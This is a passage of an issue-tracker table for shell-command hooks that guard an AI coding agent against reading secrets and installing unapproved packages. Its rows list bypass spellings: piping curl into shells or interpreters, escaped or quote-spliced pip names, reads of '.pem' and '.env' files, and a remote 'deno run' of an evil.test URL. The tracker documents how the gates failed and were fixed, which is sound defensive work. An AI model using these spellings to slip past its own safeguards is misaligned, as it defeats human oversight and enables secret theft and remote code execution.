| X-30a | **The emitted `CLAUDE.md` never carries the four-field write instruction.** Protocol Phase 8 (~1163) and `RETROFIT.md` (~1473) spec that generated `CLAUDE.md` tells the agent to write timestamp/reason/about-to/needs into the sentinel; neither `_claude_md` nor `_retrofit_claude_md` emits that line. Post-X-30 the hook *honors* agent-written content, but nothing in the emitted tree instructs the write — so the payload arrives only if the agent infers it | `open` |
| X-30b | **The "state-file watcher" half of §6.E has no emitted implementation.** Only the `Notification`-event hook exists; the documented `PostToolUse`-on-`Write` watcher is not emitted. Pre-existing honest-scope gap, unchanged by X-30 | `open` |
| X-30c | **No `.claude/sessions/` README is emitted** though Phase 7 step 6 and `RETROFIT.md:1369` both promise one documenting the checkpoint schema and the state-file mechanisms. `build_plan` has no `add()` for it; the directory is created lazily by hooks. When it lands it must carry the X-33 rules | `open` |
| X-30d | X-30 is **not retroactive**: 0-byte sentinels on existing installs stay 0 bytes and age out via the 7-day sweep. No migration warranted. A resolved-but-undeleted sentinel now persists with stale content for up to 7 days where it used to be blanked — if that confuses operators, the fix is a resolution convention in doc text, not in the hook | `no-action` |
| X-33 | **`/resume` stated no selection rule while `/checkpoint` stamped from model-supplied time.** Fixed both ends: clock stamp (`date -u +%Y-%m-%dT%H%MZ`) and mtime-not-filename resolution, with a three-rule precedence (named checkpoint ends selection; banner cross-check scoped to the mtime path) | `done` |
| X-33a | **Stamp granularity collides.** `%Y-%m-%dT%H%MZ` is minute-granular, so two checkpoints in one minute produce the same filename and the second overwrites the first. The owner's exact command was kept verbatim; no collision rule (append seconds when the name exists) was added | `open` |
| X-33b | **The supersession banner has no schema and no write side.** `/resume` says "if present", but nothing instructs `/checkpoint` to *write* a banner when a checkpoint supersedes an earlier one. Format and producer are both undefined — the consumer rule is the only half that exists | `open` |
| X-33c | **mtime is fragile — and not only across clone/checkout.** A fresh clone rewrites mtimes in checkout order, so `ls -t` can misorder committed checkpoints. **Observed live 2026-08-03, in a commoner way:** adding a supersession banner to an older checkpoint made *that* file newest by mtime, so rule 2 selected the **superseded** one. Rule 3 caught it — which is the designed behaviour and good evidence the three-rule precedence earns its keep — but it means *editing* a checkpoint, not just cloning, breaks the mtime ordering, and X-33b records that the banner half is only half-built (consumer rule exists, no writer, no schema). A stronger in-file ordering key (a required stamp header inside the body, which cannot be perturbed by touching the file) would make rule 2 self-sufficient and is the fix worth doing | `open` |
| X-33d | Doc↔skill parity for the two X-33 rules has **no single-source render**: the rules are stated in the emitted skill bodies (test-pinned) and again in the protocol doc and Companion (citation-marked only). Only the skill side is machine-checked, so the prose copies can drift | `open` |
| X-31 | **`secrets-gate` refuses negated globs** (`rg -g '!*.pem'`), i.e. refuses a command strictly safer than the bare `rg` it allows. **The exemption was attempted over four rounds and REMOVED** — see KB §4.9 and the changelog. Closed **message-only**: the refusal now names the positive-scope workaround (`rg -g '*.md'`), which is what the issue's own Impact section asks for. Gate behaviour is unchanged from 2.6.1; a future attempt needs a real shell+ripgrep grammar model, not a token rule | `decision` — reopening needs an owner call on cost |
| X-31a | **HISTORICAL — the exemption these describe was removed; kept because the shapes are the reason it was.** The first cut introduced two under-blocks. (i) Stripping backslashes before the leading-`!` test made `rg -g '\!*.pem'` — a **positive** glob in ripgrep's globset — exempt, so the gate allowed a read of the protected file where HEAD denied. (ii) An unconditional `lstrip("\"'")` on the SDK side **invented** a leading `!` on `rg -g "'!*.key"`, allowing what the shell denied. Both were **pinned as correct in four suites** before repair. Resolved fail-closed: a backslash-bearing token is never exempt; the quote-strip is scoped to the SDK's unbalanced-quote fallback path only. See KB §4.9 | `done` |
| X-31b | **`!`-less exclusion flags stay refused** — `fd -E` / `fd --exclude`, `grep --exclude(-dir)`, `tar --exclude`, `rsync --exclude` with a bare glob argument. Pinned deny on both substrates. Relaxing needs per-tool flag semantics and the rationale differs per tool: `grep -E` means extended-regexp and `--exclude-from=FILE` *reads* a file, so keying on the `!` marker is the only spelling that is exclusion on its face — **but that argument does not cover `fd -E`**, which has no competing meaning and was the tool the issue named first. Owner call | `decision` |
| X-31c | **A prefix OPERAND closes the command-word slot**, so `timeout 5 rg -g '!*.pem' TODO`, `nice -n 10 rg …` and `sudo -u root rg …` deny their negated globs (2.6.1 behavior for these shapes). Modeling wrapper-flag arity to relax this was deliberately rejected — `lib/cmdpos.py`'s ARITY section records that arity tables regress deny→allow | `no-action` |
| X-31d | Structured `Grep{pattern}` / `Glob{pattern}` payloads with a leading `!` still refuse when they suffix-match a free-form pattern. Negation on the regex/glob **pattern key** is not modeled; pre-existing, deliberately untouched | `open` |
| X-32 | **`dependency-gate` refuses fetched DATA piped into an interpreter given its program by flag** (`curl … \| python3 -c '<prog>'`). **The exemption was attempted over four rounds and REMOVED** — the `args[0]`-inspection approach needs bash's grammar plus every interpreter's; round 4 still left `node -p`, a trailing `#` comment and a subshell as live fail-opens. Closed **message-only**: the refusal stops asserting the operator is running an installer and names write-then-read instead. Gate behaviour unchanged from 2.6.1 | `decision` — reopening needs an owner call on cost |
| X-32a | **HISTORICAL — the exemption was removed; kept as the record of why.** The first cut exempted `python3 -m code`. `-m` names a **module**, not a program, and stock `code`/`asyncio` are REPLs that execute stdin — verified by execution. That is issue #32's own must-block row re-opened by five characters. Fixed by **dropping `-m` from `PROGRAM_FLAGS`** rather than allow-listing "safe" modules, which would inherit the attacker-picks-the-flag objection the flag table's own comment raises. Cost: `curl … \| python3 -m json.tool` regresses to deny. Same drop closes the `-mpip` regression below | `done` |
| X-32b | **Alternate program-flag spellings stay blocked** (fail-closed cost of `args[0]`-only inspection): `node --eval`/`--print`, `perl -E`, bundled `python3 -uc`, `python3 -- x.py`, and any flag before the program (`python3 -u parse.py`, `perl -I lib s.pl`). A prefix carrying flags or operands also loses the exemption (`timeout 5 python3 -c x`, `sudo -u nobody python3 -c x`) | `no-action` |
| X-32c | **Shell invokers never earn the data exemption**, even with an explicit program: `curl -s url \| sh -c 'wc -l'` stays deny, because a shell's `-c` can re-read stdin as commands (`sh -c '. /dev/stdin'`). Deliberate | `no-action` |
| X-32d | **`J-10`/`D20` correlation still over-reaches on downloaded DATA files:** `curl -o a.json url && python3 - a.json <<'EOF'…EOF` (heredoc is the program) and `python3 parse.py a.json` (argv data) stay deny. Needs heredoc/argv-position modeling the gate does not have; the heredoc shape is pinned as deny in the differential corpus. This is the half of issue #32 explicitly deferred | `open` |
| X-32e | **Four pipe-regex evasions that were fail-open at 2.6.1 — now CLOSED by the kept hardening.** `curl u \| (sh)`, `curl u \| { sh; }`, `curl u \| FOO=1 sh`, `curl u \| python3.11`, plus `curl u 2>&1 \| sh` and a control operator inside a quoted filename (`tee 'a;b.sh'`). All six were rc=0 at 2.6.1 and are **rc=2 here on both substrates** (verified by execution 2026-08-03). They were found while investigating #32 and closed not by the exemption — which was removed — but by the deny-direction work that survived it: command-position resolution on the run side, the widened writer set, and the tokenizer normalization. An earlier revision of this row listed them as open and claimed they were pinned; both claims are withdrawn | `done` |
| X-32i | **CLOSED — issue #36, fixed.** `python -m <tool> install` bypassed the approved list for every tool except `pip` — `pipx`, `poetry`, `pipenv`, `uv` were all denied when invoked directly and all allowed via `python -m`, in both the spaced and attached spellings, on both substrates, identically at 2.6.1. The install scanner spelled the `-m` tool literally as `pip`. Fixed **not** by enumerating `-m (TOOLS) (VERBS)` — that arm matches four of the five and misses `python3 -m uv pip install`, whose verb is `pip` rather than a `VERBS` member — but by making `python[0-9.]* +-m *` a transparent **command-position prefix** for the install anchor, the treatment `sudo`/`env`/`timeout` already get, so the remainder is re-judged by the arms that already refuse the direct spellings. The forked `TOOLS`/`VERBS` literals moved into `lib/cmdpos.py` (`install_head_tail`) in the same change, retiring the last D3 two-copies pair. The path arm came free with it: `/usr/bin/python3 -m pip install evil` was allowed on both substrates and is the ONE spelling the old literal knew, missed only because it spelled `python` bare | `done` |
| X-32j | **MOOT — the premise was the exemption, and the exemption is gone.** This row asked whether the X-31 negated-glob exemption should refuse commands carrying `$(…)`/backticks, for parity with X-32's substitution veto. With both exemptions removed there is no asymmetry to resolve: `rg -g '!*.pem' "$(cat .env)"` denies again (verified rc=2, 2026-08-03), as it did at 2.6.1. Kept as the record of a question that answered itself | `done` |
| X-32f | **Shell/SDK divergence in the D20 download-then-run scan itself**, untouched by X-32 and recorded in a code comment at the `_XP_WRITES` walk: `curl u >>a.sh ; sh a.sh` is shell-allow / SDK-deny (the shell scan keys on bare `>`/`>>` and strips a single attached `>`; the SDK spells it `lstrip(">")`). The X-32 write capture deliberately does **not** inherit that narrowness. The underlying segmenter disagreement (the SDK's `_shell_segments` keeps quote characters where the shell's `cmd_segments` drops them) is normalized at the D20 comparison points only and is still live elsewhere — worth a dedicated round | `open` |
| X-32g | **`_xp_normpath` resolves `.`/empty/`..` textually only** — it does not follow symlinks, so a path reaching stdin through one is read as an ordinary script path. A gate cannot safely `stat` the filesystem at `PreToolUse`; noted rather than attempted | `no-action` |
| X-32h | **Trust boundary, recorded once so it is not rediscovered as a bug:** an agent-**authored** program that evals its own stdin (`python3 -c 'exec(sys.stdin.read())'`) is exempt by design. The gate judges where the program **comes from**, not what it does — the program is one the agent wrote and the gate can read | `no-action` |

| X-36a | **Shell/SDK whitespace-class divergence in the install anchor, in the SAFE direction.** The anchor renders its whitespace as a literal space for bash and `\s` for Python. Python's `\s` also matches U+00A0, U+2028, U+0085 and `\x1c`–`\x1f`, which neither normalizer rewrites, so `pipx install<U+00A0>evil` is **shell-allow / SDK-deny** — measured on both this tree and 8276300, so it predates #36 (the pre-existing arms already spelled `\s`). **The shell is the side that is right:** bash word-splits on IFS, which contains none of those characters, so the string passes ONE argument `install<U+00A0>evil` as the tool's subcommand and installs nothing (verified under real bash, argc=2 for all five). The SDK's extra denial is an over-refusal on a non-executable string — the permitted direction, since the contract forbids SDK *more permissive*, not stricter. Narrowing the SDK to a literal space touches every arm of the anchor and is a parity change owed its own measurement | `open` — bounded, safe direction |
| X-36b | **`--python <ver>` blames the wrong token.** `pipx install --python 3.12 black` refuses with `not in deps.md approved list: 3.12 black` — byte-identical on 8276300, so pre-existing. `--python` is a real flag of both `pipx` and `uv` and is absent from the value-flag lists, which carry `--python-version` only, so its argument is read as a package name. This is the exact unactionable-refusal shape the `--timeout 60` note in the same table says was fixed: the operator is told to approve the string `3.12` in their dependency policy. Cheap fix (one entry per substrate list) but it is a value-flag-table change, and that table has shipped a hole three rounds running — it deserves its own measurement rather than a rider. Reachable through the #36 prefix too (`python3 -m pipx install --python 3.12 black`), which is why it surfaced | `open` |
| X-36c | **FIXED (issue #39).** The scanner now takes the LEFTMOST install phrase instead of the longest match (`_install_head_split`, both substrates): it grows a candidate one token at a time and takes the first prefix the anchor matches. The prefix run is NOT narrowed — positionals stay unbounded because `timeout 5 pip install evil` needs them — only the CHOICE of match changed. cmdpos's ARITY docstring is corrected too: unbounded consumption is safe for *is there an install here* and unsafe for *where does it start*, because `BASH_REMATCH[0]`/`m.end()` is what selects the argument tokens. Original report: **FILED as issue #39.** **A wrapper word turns the prefix run into an unbounded skip that SWALLOWS the package list.** `sudo pip install evil npx` is rc=0 on both substrates and both builds — bash runs it and it installs `evil`. The anchor's wrapper arm consumes flags and positionals without bound, so any segment ENDING in a bare install/runner phrase has its whole package list absorbed into `head_txt`; `rest` comes back empty and the segment is classified as a lockfile restore, inspecting nothing. Siblings: `env pip install evil npx`, `nice -n 5 npm install evil npx`, `sudo pip install evil uvx`, `timeout 5 pip install evil pip install`. Control: `sudo pip install evil` denies. **The module docstring's claim that unbounded consumption "cannot fail open HERE … the engine backtracks" is true of MATCHING and false of `BASH_REMATCH[0]`/`m.end()`**, which is what selects the tokens the package scan reads — that distinction is the actual defect and should be written into the docstring when this is fixed. Pre-existing and unchanged by #36 (whose `-m` run is bounded precisely to avoid adding this shape — see `install_head_tail`) | `done` |
| X-36d | **FIXED (issue #40).** `PY_INTERPRETERS` + `INTERP_SUFFIX` in `lib/cmdpos.py` are now the ONE spelling read by both `interpreter_word()` (the pipe trigger) and `install_head_tail()` (the install anchor); the `t`/`d` ABI tags also join the basename reduction on both substrates so the stage classifier and the trigger answer the same question. Original report: **FILED as issue #40.** **The interpreter word is a THIRD private spelling, and it misses two real interpreters.** `install_head_tail` spells it `python[0-9.]*`; `interpreter_word()` spells it `alt(INTERPRETERS) + "[.0-9]*"`. Both miss `pypy3` and `python3.13t` (CPython's free-threaded binary), so `pypy3 -m pip install evil` and `python3.13t -m pipx install evil` are allow/allow. **The install-anchor half is bounded; the pipe-trigger half is not** — `curl u \| pypy3` and `curl u \| python3.13t` are **allow/allow today**, which is the live remote-script-execution class the trigger exists to refuse, inherited and unrelated to #36. Deliberately not fixed as a rider on #36: widening `INTERPRETERS` changes the pipe trigger on both substrates and is owed its own before/after measurement. **Fix both spellings from one set when it is done** — a third private copy is the D3 shape | `done` |
| X-36e | **FIXED (issue #41).** Two defects, one cause — the gate judged text bash had already transformed. `cmd_word`'s quote-removal half is now `unquote_word` (no basename step, since the anchor has its own path arm) and the anchor's token scan reads through it; and adjacent quoted runs inside an invoker argument are now pushed as the SPLICED word as well as per-run, additively. Original report: **FILED as issue #41.** **Shell-only: an escaped or quote-spliced installer word bypasses the hook.** `pi\p install evil` is **shell rc=0 / SDK deny**, and `sh -c 'pi''px install evil'` likewise — bash resolves both to the real binary (`type -t pi\p` finds pip). The shell's `cmd_segments` restores backslash escapes and does not splice adjacent quoted runs inside an invoker argument, while the SDK's `_flatten_seg` drops backslashes. Direction is the PERMITTED one (shell permissive, not SDK), so it is not a contract violation — but the hook allows commands that install unapproved packages, and `cmdpos.cmd_word` already exists as the "word bash will execute" reduction that every deny-granting walk is supposed to use. Pre-existing on the direct spelling; #36 closed the SDK side of the `-m` spellings and left the shell side open, which is what made the split visible | `done` |
| X-36f | **An APPROVED package with extras is refused.** `pip install requests[socks]` denies with `not in deps.md approved list: requests[socks]` even though `requests` is approved — byte-identical on 8276300, pre-existing. `_pkg_name`/its shell twin split on `[<>=@~ ]` and never on `[`, so the extras suffix stays glued to the name and the approved-list lookup misses. Extras are ordinary pip syntax (`requests[socks]`, `celery[redis]`), so this refuses everyday installs of packages the operator has already approved. Fix direction is to strip a trailing `[...]` before the lookup — but the allow-list rules in `cmdpos.py` mean any loosening of an approved-name comparison needs the both-spellings treatment argued explicitly, not a quick split | `open` |
| X-36g | **An escaped PACKAGE name splits the substrates in the forbidden direction.** `pip install requ\ests` is **shell-DENY / SDK-ALLOW** — the SDK is more permissive, which this pair's contract forbids. Found while fixing X-36e and left alone deliberately. **No fail-open either way:** bash resolves the token to `requests`, which IS approved, so the SDK matches what bash runs and the SHELL is the one over-refusing. Fixing it is not a one-liner because it collides head-on with a deliberate posture: X-34's rule is that a gate consulting an ALLOW list judges the folded *and* the raw spelling and refuses if either refuses, precisely so decorated names cannot inherit an approval — and `requ\ests` is a decorated name. Either the SDK stops flattening package tokens (aligning with the shell and the fold rule, costing an over-refusal on a spelling bash accepts) or the fold rule gains a "backslash before an ordinary character is not decoration, it is removal" carve-out (correct per bash, but it is a carve-out in the ALLOW direction, which is the thing four rounds of X-31/X-32 kept getting wrong). Owner call, not a rider | `open` — no fail-open; contract-direction defect |
| X-36h | **PARTIALLY FIXED — four of six shapes closed; the two multi-token substitutions remain.** The install anchor now carries the same unresolvable-word arm `interpreter_word()` has had since round 5: a command-position word containing `$` or a backtick, followed by an install verb, is an install invocation whose packages get inspected. Closed: `$'\x70ip' install evil`, `$'\160ip' install evil`, `p$'\151'p install evil`, `pi${x:-p} install evil` — all deny on both substrates, where bash resolves every one to `pip`. The `$'...'` spellings are reached through the RAW pass, since `normalize_command` rewrites `$'` to `'` and the folded text carries no `$` at all. **NOT a blanket refusal:** `${PIP} install requests` still ALLOWS, because the arm makes the scanner inspect packages rather than refuse the command. **STILL OPEN:** `$(echo pip) install evil` and `` `echo pip` install evil `` — the segmenter splits on `()` so the first never reaches the anchor as one segment, and in the second the verb is not adjacent to the unresolvable word. Both are pinned as `allow` in the differential corpus so the gap is legible rather than silent. Closing them requires the segmenter to treat a command substitution as ONE unit, which is a change to every gate that shares the header, not to this anchor | `open` — the substitution half |
| X-36i | **`INTERP_SUFFIX` covers the upstream ABI tags but not the distro spellings.** Pre-existing: `curl u \| python3-dbg`, `curl u \| python3.11-dbg` (Debian/Ubuntu debug interpreter → remote execution) and `curl u \| python3.6m` (pymalloc suffix) are allow/allow, while `curl u \| python3.13t` correctly denies. The `[td]*` class models CPython's *in-tree* `python3d`, which is not the name the debug build actually ships under on Debian derivatives — so the docstring calling `d` "the debug build" is true upstream and misleading downstream. **Second half, same row:** `INSTALL_TOOLS` still spells the pip family `pip[0-9.]*`, a THIRD private copy of the interpreter-suffix idea that #40 did not unify, with a demonstrable asymmetry — `python3.13t -m pip install evil` denies while `pip3.13t install evil` allows. Fix both from one spelling or the D3 shape simply moves | `open` |
| X-36j | **FIXED.** `_py` is now bracket-aware: it tracks `[...]` and rewrites `(` only outside a bracket expression, so `prefix_run`'s `[({]` survives instead of becoming the class `[(?:{]`. The SDK's prefix run no longer accepts `?` and `:` as glue, which removes the split behind every shell/SDK parity disagreement a 1500-command fuzz found (`:npx evil install` was shell-allow / SDK-deny; both allow now, and bash agrees — `:npx` is one word and no such command exists). Written as a parser rather than a substitution because the alternative — a rule that no cmdpos regex may put `(` inside `[...]` — is unwritten, unenforced, and was already violated | `done` |
| X-36k | **An ESCAPED SPACE joins two words, and the segment-level reduction cannot tell that from renaming one.** `git commit -m deno\ run\ https://evil.test/x.ts` is argv `[git][commit][-m][deno run https://…]` — ONE operand, nothing named deno runs — but deleting the backslashes makes the segment read as a remote run, so it denies. Pre-existing (v2.7.0 denies it too, by a different route: `cmd_segments` drops real quotes). It is the counterexample to `cmdpos.strip_escapes`' claim that deleting a backslash "can only produce a word bash would really resolve", and that docstring is corrected to say "usually". Bounded: over-refusal only, symmetric across substrates, and the workaround is to quote the message instead of escaping its spaces | `open` — over-refusal, low priority |
| X-36l | **FIXED.** `dependency-gate` joins both timeout tables at **60 s** — `templates.TIMEOUTS` (emitted `settings.json`) and `_GATE_TIMEOUTS` (the SDK module). A `PreToolUse` timeout fails CLOSED at the seam's runtime floor, so the bound refuses a pathological command rather than allowing one. The gate matches every `Bash` call, shares `secrets-gate`'s superlinear tokenizer byte-for-byte, and carries an install anchor with nested quantifiers on top: measured 0.9 / 3.6 / 14.6 / 56 s at 1,000 / 2,000 / 4,000 / 8,000 assignment tokens. It is LESS hot than secrets-gate (which also registers on six file tools), which changes how often the bound is reached, not whether it is needed | `done` |
| X-34 | **The allow-list fold residue, one payload.** `cp '.env.example ;` — an unbalanced quote naming an allow-listed dotenv **template** — is denied by v2.6.1 and allowed here. The cause is the kept normalization making the allow-list entry recognisable, which is the same repair that closes live secret disclosures 2.6.1 shipped (`cat 'important.pem ;` 0→2). A class of **66** sibling payloads (50 `secrets-gate`, 16 `dependency-gate`, found by a systematic decoration sweep — a first pass had sampled only six) was closed architecturally: **a gate consulting an allow list now judges the folded AND the raw spelling and refuses if either refuses** (`cmdpos.command_spellings`), so the deny set is a superset of 2.6.1's by construction. This one survives because the unbalanced-quote fold happens inside the tokenizer, below that split. **Bounded:** bash refuses to parse the command at all (`unexpected EOF`), 2.6.1 allows the same string without the trailing `;`, and the deny-list side is unaffected (`cp '.env.production ;`, `cat 'secrets/prod.yaml ;` deny on both). Left deliberately: special-casing it ahead of the allow list is the spelling-patch treadmill KB §4.9 is about | `open` — bounded, low priority |

## Priority reading

Highest-signal actionable clusters: **B** (seam follow-ups) and **E** (smoke /
cross-mode coverage). **P-1** is the highest-impact open item overall — a
safety fix that does not reach the installs that need it. **W-1a** is cheap and
should be done before the next release that touches worktrees; **W-1c** is the
mechanical detector W-1 deliberately did not build. **X-32i** was the one
genuinely-open new fail-open this batch surfaced; it is **closed** (issue #36,
fixed by making `python -m` a command-position prefix). **X-31** and
**X-32** are `decision` rows, not open work: their exemptions were attempted
over four rounds and removed, and reopening them is an owner call about cost —
read KB §4.9 before spending anything there. **A**, **F-4**, **O-3** and
**P-9** are decisions only. **D** and **G** are mostly small cleanups. **H** is
effectively closed. B-2 and B-3 are blocked on the Tessera roadmap, not on us.
